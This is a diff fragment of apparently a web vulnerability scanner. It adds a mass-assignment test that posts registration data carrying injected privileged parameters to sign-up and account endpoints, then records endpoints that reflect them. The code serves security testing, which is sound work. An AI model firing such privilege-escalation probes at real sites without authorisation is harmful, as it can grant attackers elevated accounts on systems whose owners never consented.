+        mass_endpoints = [e for e in endpoints if any(
+            x in e.url.lower() for x in ["register", "signup", "user", "profile", "update", "account"]
+        )]
+        
+        for endpoint in mass_endpoints:
+            for param, value in dangerous_params:
+                # Add dangerous param to normal registration data
+                data = {
+                    "username": f"test_{param}",
+                    "email": f"test_{param}@test.com",
+                    "password": "TestPassword123!",
+                    param: value
+                }
+                
+                resp = self._make_request("POST", endpoint.url, json_data=data)
+                
+                # Check if param was accepted
+                if resp.status_code in [200, 201]:
+                    try:
+                        resp_data = json.loads(resp.body)
+                        # Check if our injected param appears in response
+                        if param in str(resp_data) and str(value).lower() in str(resp_data).lower():
+                            results.append(VulnTestResult(
+                                vuln_type="Mass Assignment",
+                                payload=f"{param}={value}",
+                                target_url=endpoint.url,
+                                request_data=json.dumps(data),
+                                response=resp,
+                                is_vulnerable=True,
+                                confidence=0.85,
+                                evidence=f"Privileged parameter '{param}' accepted and reflected",
+                                evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
+                            ))
+                            return results
+                    except:
+                        pass
+        
         return results
